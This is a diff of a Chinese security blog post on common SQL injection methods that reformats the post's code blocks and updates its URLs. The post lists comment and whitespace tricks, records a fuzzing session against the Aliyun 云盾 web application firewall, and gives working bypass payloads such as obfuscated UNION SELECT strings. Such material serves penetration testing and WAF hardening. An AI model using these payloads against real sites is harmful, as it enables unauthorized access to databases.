@@ -71,18 +71,18 @@
 
 
 
-<meta name="description" content="常用注释符：1//, --, /**/, #, --+, -- -, ;%00 空格：1/**/, &amp;lt;&amp;gt;, %a0 空白字符：1+号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1) 这里举一个云盾的案例，并附上当时fuzz的过程：12345678910union+select 拦截select+from 不拦截select+fro">
+<meta name="description" content="常用注释符： //, --, /**/, #, --+, -- -, ;%00  空格： /**/, &amp;lt;&amp;gt;, %a0  空白字符： +号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1)  这里举一个云盾的案例，并附上当时fuzz的过程： union+select 拦截 select+from 不拦截 select+from+表名">
 <meta name="keywords" content="sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入常用方法">
-<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/SQL注入常用方法/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/11/10/SQL注入常用方法/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="常用注释符：1//, --, /**/, #, --+, -- -, ;%00 空格：1/**/, &amp;lt;&amp;gt;, %a0 空白字符：1+号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1) 这里举一个云盾的案例，并附上当时fuzz的过程：12345678910union+select 拦截select+from 不拦截select+fro">
+<meta property="og:description" content="常用注释符： //, --, /**/, #, --+, -- -, ;%00  空格： /**/, &amp;lt;&amp;gt;, %a0  空白字符： +号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1)  这里举一个云盾的案例，并附上当时fuzz的过程： union+select 拦截 select+from 不拦截 select+from+表名">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-10T09:12:32.943Z">
+<meta property="og:updated_time" content="2020-02-26T10:47:33.226Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入常用方法">
-<meta name="twitter:description" content="常用注释符：1//, --, /**/, #, --+, -- -, ;%00 空格：1/**/, &amp;lt;&amp;gt;, %a0 空白字符：1+号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1) 这里举一个云盾的案例，并附上当时fuzz的过程：12345678910union+select 拦截select+from 不拦截select+fro">
+<meta name="twitter:description" content="常用注释符： //, --, /**/, #, --+, -- -, ;%00  空格： /**/, &amp;lt;&amp;gt;, %a0  空白字符： +号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1)  这里举一个云盾的案例，并附上当时fuzz的过程： union+select 拦截 select+from 不拦截 select+from+表名">
 
 
 
@@ -112,12 +112,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/SQL注入常用方法/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/11/10/SQL注入常用方法/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>SQL注入常用方法 | h1tler's blog</title>
   
 
@@ -255,7 +255,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/SQL注入常用方法/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/11/10/SQL注入常用方法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -349,13 +349,56 @@
       
 
       
-        <p>常用注释符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//, --, /**/, #, --+, -- -, ;%00</div></pre></td></tr></table></figure></p>
-<p>空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/**/, &lt;&gt;, %a0</div></pre></td></tr></table></figure></p>
-<p>空白字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1)</div></pre></td></tr></table></figure></p>
-<p>这里举一个云盾的案例，并附上当时fuzz的过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">union+select 拦截</div><div class="line">select+from 不拦截</div><div class="line">select+from+表名 拦截</div><div class="line">union(select) 不拦截</div><div class="line">所以可以不用在乎这个union了。</div><div class="line">union(select user from ddd) 拦截</div><div class="line">union(select%0aall) 不拦截</div><div class="line">union(select%0aall user from ddd) 拦截</div><div class="line">fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。</div><div class="line">union(select%0aall&#123;user&#125;from&#123;ddd&#125;) 不拦截。</div></pre></td></tr></table></figure></p>
-<p>Bypass Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 union(select%0aall&#123;x users&#125;from&#123;x ddd&#125;)</div><div class="line">1 union(select%0adistinct&#123;x users&#125;from&#123;x ddd&#125;)</div><div class="line">1 union(select%0adistinctrow&#123;x users&#125;from&#123;x ddd&#125;)</div></pre></td></tr></table></figure></p>
-<p>可运用的sql函数&amp;关键字(节选部分)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">字符转换</div><div class="line">Char(49)</div><div class="line">Hex(&apos;a&apos;)</div><div class="line">Unhex(61)</div><div class="line">过滤了逗号</div><div class="line">(1)limit处的逗号：</div><div class="line">limit 1 offset 0</div><div class="line">字符串截取函数</div><div class="line">Substring(@@version,1,1)</div><div class="line">Left(@@version,1)</div><div class="line">Right(@@version,1)</div><div class="line">(2)字符串转换函数</div><div class="line">Ascii(&apos;a&apos;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</div><div class="line">Char(&apos;97&apos;)</div><div class="line">exec</div></pre></td></tr></table></figure></p>
-<p>一些常见的bypass：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">id=1+(UnIoN)+(SelECT)+</div><div class="line">id=1+(UnIoN+SeLeCT)+</div><div class="line">id=1+(UnI)(oN)+(SeL)(EcT)</div><div class="line">id=1+&apos;UnI&apos;&apos;On&apos;+&apos;SeL&apos;&apos;ECT&apos; &lt;-MySQL only</div><div class="line">id=1+&apos;UnI&apos;||&apos;on&apos;+SeLeCT&apos; &lt;-MSSQL only</div></pre></td></tr></table></figure></p>
+        <p>常用注释符：</p>
+<pre><code class="language-html">//, --, /**/, #, --+, -- -, ;%00
+</code></pre>
+<p>空格：</p>
+<pre><code class="language-html">/**/, &lt;&gt;, %a0
+</code></pre>
+<p>空白字符：</p>
+<pre><code class="language-html">+号, -号, ``符号, ~号, !号, @`形式`, 点号.1, 单引号双引号, 括号select(1)
+</code></pre>
+<p>这里举一个云盾的案例，并附上当时fuzz的过程：</p>
+<pre><code class="language-html">union+select 拦截
+select+from 不拦截
+select+from+表名 拦截
+union(select) 不拦截
+所以可以不用在乎这个union了。
+union(select user from ddd) 拦截
+union(select%0aall) 不拦截
+union(select%0aall user from ddd) 拦截
+fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。
+union(select%0aall{user}from{ddd}) 不拦截。
+</code></pre>
+<p>Bypass Payload：</p>
+<pre><code class="language-html">1 union(select%0aall{x users}from{x ddd})
+1 union(select%0adistinct{x users}from{x ddd})
+1 union(select%0adistinctrow{x users}from{x ddd})
+</code></pre>
+<p>可运用的sql函数&amp;关键字(节选部分)：</p>
+<pre><code class="language-html">字符转换
+Char(49)
+Hex(&#39;a&#39;)
+Unhex(61)
+过滤了逗号
+(1)limit处的逗号：
+limit 1 offset 0
+字符串截取函数
+Substring(@@version,1,1)
+Left(@@version,1)
+Right(@@version,1)
+(2)字符串转换函数
+Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass
+Char(&#39;97&#39;)
+exec
+</code></pre>
+<p>一些常见的bypass：</p>
+<pre><code class="language-html">id=1+(UnIoN)+(SelECT)+
+id=1+(UnIoN+SeLeCT)+
+id=1+(UnI)(oN)+(SeL)(EcT)
+id=1+&#39;UnI&#39;&#39;On&#39;+&#39;SeL&#39;&#39;ECT&#39; &lt;-MySQL only
+id=1+&#39;UnI&#39;||&#39;on&#39;+SeLeCT&#39; &lt;-MSSQL only
+</code></pre>
 <p>参考链接:<br><a href="http://www.freebuf.com/articles/web/36683.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/36683.html</a><br><a href="https://paper.seebug.org/218/" target="_blank" rel="external">https://paper.seebug.org/218/</a></p>
 
       
@@ -472,7 +515,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -584,7 +627,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
